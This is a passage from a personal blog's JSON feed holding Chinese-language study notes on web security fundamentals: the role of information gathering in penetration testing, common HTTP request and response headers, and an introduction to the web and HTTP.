            "id": "http://avenue.cool/Python/Python%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/",
            "url": "http://avenue.cool/Python/Python%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/",
            "title": "Python语言学习",
            "date_published": "2020-09-06T02:30:59.000Z",
            "content_html": "<!-- build time:Tue Feb 02 2021 10:50:12 GMT+0800 (中国标准时间) --><p>this is test</p><!-- rebuild by hrmmi -->",
            "tags": [
                "Python语言学习",
                "Python语言学习"
            ]
        },
        {
            "id": "http://avenue.cool/WEB/Information-Gathering/1.%20%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E8%BF%9B%E8%A1%8C%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/",
            "url": "http://avenue.cool/WEB/Information-Gathering/1.%20%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E8%BF%9B%E8%A1%8C%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/",
            "title": "1. 为什么要进行信息收集",
            "date_published": "2020-09-06T02:30:59.000Z",
            "content_html": "<!-- build time:Tue Feb 02 2021 10:50:12 GMT+0800 (中国标准时间) --><div class=\"note info\"><p>以下为个人学习笔记和习题整理</p></div><p>在进行渗透测试之前，最重要的一步就是信息收集，在这个阶段，我们要尽可能的去搜集目标组织的信息。我们越是了解测试目标，测试的工作就越容易，在信息收集中，最重要的是收集服务器的配置信息和网站的敏感信息，其中包括域名和子域名信息，目标网站系统，CMS 指纹，目标网站真实 IP，开放的端口等，换句话说，只要是与目标网站相关的信息，我们都应该尽量收集。</p><p>&quot;只有不努力的黑客，没有攻不破的系统&quot;。<br>在 SRC 漏洞挖掘或渗透测试中，信息收集占很大一部分，能收集到别人收集不到的资产，就能挖到别人挖不到的洞。</p><!-- rebuild by hrmmi -->",
            "tags": [
                "WEB安全知识",
                "信息收集",
                "信息收集"
            ]
        },
        {
            "id": "http://avenue.cool/WEB/Web-Foundation/HTTP%E5%93%8D%E5%BA%94%E5%A4%B4/",
            "url": "http://avenue.cool/WEB/Web-Foundation/HTTP%E5%93%8D%E5%BA%94%E5%A4%B4/",
            "title": "3. WEB常见的HTTP响应头",
            "date_published": "2020-09-06T02:30:59.000Z",
            "content_html": "<!-- build time:Tue Feb 02 2021 10:50:12 GMT+0800 (中国标准时间) --><div class=\"note info\"><p>以下为个人学习笔记和习题整理</p></div><ul><li><h2 id=\"1-响应报文格式\"><a class=\"anchor\" href=\"#1-响应报文格式\">#</a> （1）、响应报文格式：</h2></li></ul><p>&lt;version&gt;&lt;status&gt;&lt;reason-phrase&gt;<br>&lt;headers&gt;<br>&lt;entity-body&gt;</p><ul><li><h2 id=\"2-响应头报文\"><a class=\"anchor\" href=\"#2-响应头报文\">#</a> （2）、响应头报文：</h2></li></ul><p>Accept-Ranges<br>表明服务器是否支持指定范围请求及哪种类型的分段请求<br>Accept-Ranges: bytes</p><p>Access-Control-Allow-Origin<br>配置有权限访问资源的域<br>Access-Control-Allow-Origin: &lt;origin&gt;|*</p><p>Allow<br>对某网络资源的有效的请求行为，不允许则返回 405<br>Allow: GET, HEAD</p><p>Cache-Control<br>告诉所有的缓存机制是否可以缓存及哪种类型<br>Cache-Control: no-cache</p><p>Content-Encoding<br>web 服务器支持的返回内容压缩编码类型。<br>Content-Encoding: gzip</p><p>Content-Language<br>响应体的语言<br>Content-Language: en,zh</p><p>Content-Length<br>响应体的长度<br>Content-Length: 348</p><p>Content-Location<br>请求资源可替代的备用的另一地址<br>Content-Location: /index.htm</p><p>Content-Type<br>返回内容的 MIME 类型<br>Content-Type: text/html; charset=utf-8</p><p>Date<br>原始服务器消息发出的时间<br>Date: Tue, 15 Nov 2010 08:12:31 GMT</p><p>ETag<br>请求变量的实体标签的当前值<br>ETag: &quot;737060cd8c284d8af7ad3082f209582d&quot;</p><p>Location<br>用来重定向接收方到非请求 URL 的位置来完成请求或标识新的资源<br>Location: <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy56Y21oaS5jb20vYXJjaGl2ZXMvOTQuaHRtbA==\">http://www.zcmhi.com/archives/94.html</span></p><p>Proxy-Authenticate<br>它指出认证方案和可应用到代理的该 URL 上的参数<br>Proxy-Authenticate: Basic</p><p>Refresh<br>应用于重定向或一个新的资源被创造，在 5 秒之后重定向（由网景提出，被大部分浏览器支持）<br>Refresh: 5; url=http://www.zcmhi.com/archives/94.html</p><p>Server<br>web 服务器软件名称<br>Server: Apache/1.3.27 (Unix) (Red-Hat/Linux)</p><p>Set-Cookie<br>设置 Http Cookie Set-Cookie: UserID=JohnDoe; Max-Age=3600; Version=1</p><p>Strict-Transport-Security<br>设置浏览器强制使用 HTTPS 访问<br>max-age: x 秒的时间内 访问对应域名都使用 HTTPS 请求<br>includeSubDomains: 网站的子域名也启用规则<br>Strict-Transport-Security: max-age=1000; includeSubDomains</p><p>X-Frame-Options<br>配置页面是否能出现在 &lt;frame&gt;, &lt;iframe&gt;, &lt;embed&gt;, &lt;object&gt; 等标签中，防止点击劫持<br>X-Frame-Options: deny<br>SAMEORGIN：仅同源域名下的页面匹配时许可</p><p>X-XSS-Protection<br>配置 XSS 防护机制<br>X-XSS-Protection: 1; mode=block</p><p>HttpOnly：使 JavaScript 脚本无法获取 cookie，防止 xss 攻击。</p><p>X-Powered-By：可以知道 web 后端语言（但是可以修改）</p><!-- rebuild by hrmmi -->",
            "tags": [
                "WEB安全知识",
                "WEB基础知识",
                "WEB基础知识"
            ]
        },
        {
            "id": "http://avenue.cool/WEB/Web-Foundation/%E5%B8%B8%E8%A7%81%E7%9A%84HTTP%E8%AF%B7%E6%B1%82%E5%A4%B4/",
            "url": "http://avenue.cool/WEB/Web-Foundation/%E5%B8%B8%E8%A7%81%E7%9A%84HTTP%E8%AF%B7%E6%B1%82%E5%A4%B4/",
            "title": "2. 常见的HTTP请求头",
            "date_published": "2020-09-06T02:30:59.000Z",
            "content_html": "<!-- build time:Tue Feb 02 2021 10:50:12 GMT+0800 (中国标准时间) --><div class=\"note info\"><p>以下为个人学习笔记和习题整理</p></div><h1 id=\"常见的-http-请求头\"><a class=\"anchor\" href=\"#常见的-http-请求头\">#</a> 常见的 HTTP 请求头</h1><ul><li><h2 id=\"1-请求报文格式\"><a class=\"anchor\" href=\"#1-请求报文格式\">#</a> （1）、请求报文格式</h2></li></ul><p>&lt;method&gt;&lt;request-URL&gt;&lt;version&gt;<br>&lt;headers&gt;<br>&lt;entity-body&gt;</p><ul><li><h2 id=\"2请求方法\"><a class=\"anchor\" href=\"#2请求方法\">#</a> （2）请求方法：</h2></li></ul><p>GET：请求指定页面信息，并返回主体，数据插入进 URL 中进行传输。<br>POST：向指定资源提交数据进行请求，数据被放在请求数据体中传输。<br>HEAD：类似 GET 请求，但只获取头部信息，无响应体。<br>PUT：将传输数据取代指定文档传输。<br>DELETE：请求服务器删除指定页面。<br>CONNECT：与代理服务器可以进行管道方式连接。<br>OPTIONS：查询针对请求 URL 指定资源支持的方法。<br>TRACE：可以对请求消息的传输路径追踪。<br>MOVE：请求服务器将指定的页面移动到另一个网络地址上。</p><ul><li><h2 id=\"3请求头部常见的请求头\"><a class=\"anchor\" href=\"#3请求头部常见的请求头\">#</a> （3）请求头部：（常见的请求头）</h2></li></ul><p>Accept<br>指定客户端能够接收的内容类型<br>Accept: text/plain, text/html</p><p>Accept-Charset<br>浏览器可以接受的字符编码集<br>Accept-Charset: iso-8859-5</p><p>Accept-Encoding<br>指定浏览器可以支持的 web 服务器返回内容压缩编码类型<br>Accept-Encoding: compress, gzip</p><p>Accept-Language<br>浏览器可接受的语言<br>Accept-Language: en,zh</p><p>Authorization<br>HTTP 授权的授权证书<br>Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</p><p>Cache-Control<br>指定请求和响应遵循的缓存机制 Cache-Control: no-cache</p><p>Connection<br>表示是否需要持久连接 // HTTP 1.1 默认进行持久连接<br>Connection: close</p><p>Cookie<br>HTTP 请求发送时，会把保存在该请求域名下的所有 cookie 值一起发送给 web 服务器<br>Cookie: role=admin;ssid=1</p><p>Content-Length<br>请求的内容长度<br>Content-Length: 348</p><p>Content-Type<br>请求的与实体对应的 MIME 信息<br>Content-Type: application/x-www-form-urlencoded</p><p>Date<br>请求发送的日期和时间<br>Date: Tue, 15 Nov 2010 08:12:31 GMT</p><p>Host<br>指定请求的服务器的域名和端口号<br>Host: <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5naXRodWIuY29t\">www.github.com</span></p><p>If-Match<br>只有请求内容与实体相匹配才有效<br>If-Match: &quot;737060cd8c284d8af7ad3082f209582d&quot;</p><p>If-Modified-Since<br>如果请求的部分在指定时间之后被修改则请求成功，未被修改则返回 304 代码 (比较资源更新的时间）<br>If-Modified-Since: Sat, 29 Oct 2018 19:43:31 GMT</p><p>If-None-Match<br>如果内容未改变返回 304 代码，参数为服务器先前发送的 Etag，与服务器回应的 Etag 比较判断是否改变<br>If-None-Match: &quot;737060cd8c284d8af7ad3082f209582d&quot;</p><p>If-Range<br>如果实体未改变，服务器发送客户端丢失的部分，否则发送整个实体。参数也为 Etag<br>If-Range: &quot;737060cd8c284d8af7ad3082f209582d&quot;</p><p>Max-Forwards<br>限制信息通过代理和网关传送的时间<br>Max-Forwards: 10</p><p>Proxy-Authorization<br>连接到代理的授权证书<br>Proxy-Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</p><p>Range<br>只请求实体的一部分，指定范围<br>Range: bytes=500-999</p><p>Referer<br>先前网页的地址，当前请求网页紧随其后，即来路<br>Referer: <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy56Y21oaS5jb20vYXJjaGl2ZXMvNzEuaHRtbA==\">http://www.zcmhi.com/archives/71.html</span></p><p>User-Agent<br>User-Agent 的内容包含发出请求的用户信息<br>User-Agent: Mozilla/5.0 (Linux; X11)</p><!-- rebuild by hrmmi -->",
            "tags": [
                "WEB安全知识",
                "WEB基础知识",
                "WEB基础知识"
            ]
        },
        {
            "id": "http://avenue.cool/WEB/Web-Foundation/Web%E7%AE%80%E4%BB%8B/",
            "url": "http://avenue.cool/WEB/Web-Foundation/Web%E7%AE%80%E4%BB%8B/",
            "title": "1. WEB简介",
            "date_published": "2020-09-06T02:30:59.000Z",
            "content_html": "<!-- build time:Tue Feb 02 2021 10:50:12 GMT+0800 (中国标准时间) --><div class=\"note info\"><p>以下为个人学习笔记和习题整理</p></div><h1 id=\"web-简介\"><a class=\"anchor\" href=\"#web-简介\">#</a> Web 简介</h1><h2 id=\"1-什么是-web\"><a class=\"anchor\" href=\"#1-什么是-web\">#</a> 1、什么是 WEB ？</h2><p>既然我们要学习 Web 安全，当然要简单的了解 web 的含义，Web 与现在与我们生活息息相关，通过手机或者电脑刷新闻，看个视频，或者说……(咳咳)。这其中涉及到 几个基本的点，从通信，会接触到 URL，到协议，会接触到 HTTP、HTTPS、HSTS，再到前后端的 概念，前端即 HTML，CSS，JavaScript，三剑客。后端，即处理脚本语言，比如 PHP，JAVA，python，SQL（语句）等等。</p><p>WEB：www 全球广域网（World Wide WEB），就是我们所说的万维网。他是一种基于超文本和 HTTP 的、全球性的、动态交互的、跨平台的分布式图形信息系统。是建立在 Internet 上的一种网络服务，为浏览者在 Internet （因特网） 上查找和浏览信息提供了图形化、易于访问的直观界面，其中的文档及超链接将 internet 上的信息节点组织成了一个互为关联的网状结构。</p><h2 id=\"2-web-发展史\"><a class=\"anchor\" href=\"#2-web-发展史\">#</a> 2、WEB 发展史：</h2><ul><li><p>(1) 静态页面<br>在互联网最初开始的时候，Web 网站的主要内容是静态的，由文字和 图片组成， 制作和表现形式也是以表格为主。当时的用户行为也非常 简单，仅仅是浏览网页就行。</p></li><li><p>(2) 多媒体阶段<br>随着技术的不断发展，音频、视频、Flash 等多媒体技术诞生了。多媒体的加入 使得网页变得更加生动形象，网页上的交互也给用户带来了更好的体验。</p></li><li><p>(3) CGI 阶段<br>渐渐的，多媒体已经不能满足人们的请求，于是 CGI（Common Gateway Interface） 应运而生。CGI 定义了 Web 服务器与外部应用程序之间的通信接口标准，因此 Web 服务器可以通过 CGI 执行外部程序，让外部程序根据 Web 请求内容生成动态的内容。<br>在这个时候，各种编程语言如 PHP/ASP/JSP 也逐渐加入市场，基于这些语言可以 实现更加模块化的、功能更强大的应用程序。</p></li><li><p>(4) AJAX<br>在开始的时候，用户提交整个表单后才能获取结果，用户体验极差。于是 Ajax （Asynchronous Javascript And XML）技术逐渐流行起来，它使得应用在不更新整个页面的前提下也可以获得或更新数据。这使得 Web 应用程序更为迅捷地回 应用户动作，并避免了在网络上发送那些没有改变的信息。</p></li><li><p>(5) MVC<br>随着 Web 应用开发越来越标准化，出现了 MVC 等思想。MVC 是 Model/View/Control 的缩写，Model 用于封装数据和数据处理方法，视图 View 是数据的 HTML 展现， 控制器 Controller 负责响应请求，协调 Model 和 View。<br>Model，View 和 Controller 的分开，是一种典型的关注点分离的思想，使得代码复用性和组织性更好，Web 应用的配置性和灵活性也越来越好。而数据访问也 逐渐通过面向对象的方式来替代直接的 SQL 访问，出现了 ORM（Object Relation Mapping）的概念。<br>除了 MVC，类似的设计思想还有 MVP，MVVM 等。</p></li><li><p>(6) RESTful<br>在 CGI 时期，前后端通常是没有做严格区分的，随着解耦和的需求不断增加，前后端的概念开始变得清晰。前端主要指网站前台部分，运行在 PC 端、移动端等 浏览器上展现给用户浏览的网页，由 HTML5、CSS3、JavaScript 组成。后端主要指网站的逻辑部分，涉及数据的增删改查等。<br>此时，REST（Representation State Transformation）逐渐成为一种流行的 Web 架构风格。<br>REST 鼓励基于 URL 来组织系统功能，充分利用 HTTP 本身的语义，而不是仅仅将 HTTP 作为一种远程数据传输协议。</p></li><li><p>(7) 云服务<br>随着时间的发展，Web 的架构越发复杂，负载均衡、数据库分表、异地容灾、缓 存、CDN、消息队列等技术开始应用，增加了 Web 开发和运维的复杂度。同时云 服务开始逐渐发展，部署环境容器化，各个功能拆成微服务或是 Serverless 的 架构。</p></li></ul><h2 id=\"2-web-工作方式\"><a class=\"anchor\" href=\"#2-web-工作方式\">#</a> 2、WEB 工作方式：</h2><ul><li><p>(1) 什么是 DNS 服务器？<br>DNS（域名系统，Domain Name System）， 它作为将域名和 IP 地址相互映射的一 个分布式数据库，能够使人更方便地访问互联网。<br>通俗来说，这就是一个大型的数据库，里面存放着 URL 以及与其对应的 IP 地址，类比一下就好像字典里的索引，可以根据索引找到内容。</p></li><li><p>(2) 首先我们会用浏览器访问各种资源，浏览器是客户端角色，当你输入 URL 时，浏览器会首先请求 DNS 服务器，DNS 根据你请求的 URL 返回对应的 IP 地址，接下来，浏览器会带着你请求的信息去访问该 IP 的服务器，来处理你的请求，当服务器接收到了你的请求后，会根据 HTTP 协议所带的数据，来对你的访问进行处理，这个处理就是后端过程，可能使用的是 PHP，可能是 JAVA 语言，或者其他的 ASP、ASPX，处理完成之后再将这些信息返回给客户端，客户端根据返回的数据进行呈现，呈现的网页即为前端，其中包括了 HTML,CSS,JavaScript，基本元素，一个丰富的页面就呈现在了你的眼前。</p></li></ul><p><img data-src=\"/images/web%E5%9F%BA%E7%A1%80/Http.png\" alt=\"\"></p><h2 id=\"三-http-简介\"><a class=\"anchor\" href=\"#三-http-简介\">#</a> 三、HTTP 简介：</h2><ul><li><p>(1) HTTP（HyperText Transfer Protocol，超文本传输协议），是因特网上应用最为广泛的一种网络传输协议，所有的 WWW 文件都必须遵守这个标准。<br>HTTP 是一个基于 TCP/IP 通信协议来传递数据（HTML 文件，图片文件，查询结果等）。</p></li><li><p>(2) HTTP 协议属于应用层协议，建立在 TCP 之上，HTTP 协议以客户端请求和服务端应答为标准，浏览器称为客户端，而 web 服务器称为服务器。客户端打开任意端口向服务器的 80 端口发起 http 请求，首先会发起 TCP 三次握手，是为了建立数据连接通道，通道建立成功后，进行 HTTP 数据交互。<br>当客户端请求的数据接收完毕后，HTTP 服务器会断开 TCP 连接，整个 HTTP 连接的过程非常短，HTTP 连接也被称为无状态的连接，无状态连接是指客户端每次向服务器发起 HTTP 请求时，每次请求都会建立一个新的 HTTP 连接，而不是在一个 HTTP 请求基础上进行所有的数据交互。</p></li><li><p>(3) 发起 HTTP 请求的内容资源由统一资源标识符（Uniform Resource Identifiers，URI）来标识，关于资源定位和标识符有三种：URI 、URN、URL，三种资源定位解释如下：<br>统一资源标识符（Uniform Resource identifier，URI），用来唯一标识一个资源；<br>统一资源定位符（uniform resource locator ， URL），是一种具体的 URI，URL 可以用来标识一个资源，而且访问获取该资源；<br>统一资源命名（uniform resource name，URN），通过名字来标识或识别资源；</p></li></ul><p><img data-src=\"/images/web%E5%9F%BA%E7%A1%80/URI.png\" alt=\"\"></p><p>完整的 URL 标识格式如下：<br>protocol：//host [:port]/path/..../[?query-string][#anchor]<br>protocol // 基于某种协议，常见协议：HTTP、HTTPS、FTP、RSYNC 等；<br>host // 服务器的 IP 地址或者域名；<br>port // 服务器的端口号，如果是 HTTP，默认是 80 端口；<br>path // 访问资源在服务器的路径；<br>query-string // 传递给服务器的参数及字符串<br>anchor // 锚定结束；</p><ul><li>(4) HTTP 请求报文<br>完整的 HTTP 请求包含以下内容，请求方法一般是 GET 和 POST，URL 即你请求的地址，协议版本一般都是 HTTP/1.1，然后配合着请求头，来访问你请求的资源，请求头有通用的，也有厂家自定义的。如果是 POST 请求，会携带请求数据。 GET 请求的数据会在 URL 处携带查询，即我们前面说到的 ？query-string 部分，POST 只不过把查询部分放在了请求报文中，即下面请求数据的部分，这样做的<br>目的是，较为安全的保障所请求的数据。GET 所请求的数据在 URL 中，一般大家都能看到，但是现在不管哪种请求，都或多或少的加入了编码，这样数据不进行特定的方式解码，是看不到具体数据的。</li></ul><p><img data-src=\"/images/web%E5%9F%BA%E7%A1%80/Httpheader.png\" alt=\"\"></p><ul><li>(5) HTTP 请求方法：</li><li>GET：请求指定页面信息，并返回主体，数据插入进 URL 中进行传输。</li><li>POST：向指定资源提交数据进行请求，数据被放在请求数据体中传输。</li><li>HEAD：类似 GET 请求，但只获取头部信息，无响应体。</li><li>PUT：将传输数据取代指定文档传输。</li><li>DELETE：请求服务器删除指定页面。</li><li>CONNECT：与代理服务器可以进行管道方式连接</li><li>OPTIONS：查询针对请求 URL 指定资源支持的方法。</li><li>TRACE：可以对请求消息的传输路径追踪。</li><li>MOVE：请求服务器将指定的页面移动到另一个网络地址上</li></ul><!-- rebuild by hrmmi -->",
            "tags": [
                "WEB安全知识",
                "WEB基础知识",
                "WEB基础知识"
            ]
        },
        {
            "id": "http://avenue.cool/hello-world/",
            "url": "http://avenue.cool/hello-world/",
            "title": "Hello juvenile",
            "date_published": "2020-09-05T11:34:46.456Z",
            "content_html": "<!-- build time:Tue Feb 02 2021 10:50:12 GMT+0800 (中国标准时间) --><p>Welcome to My Blog, We Learn together and grow together</p><!-- rebuild by hrmmi -->",
            "tags": []
        }
    ]
}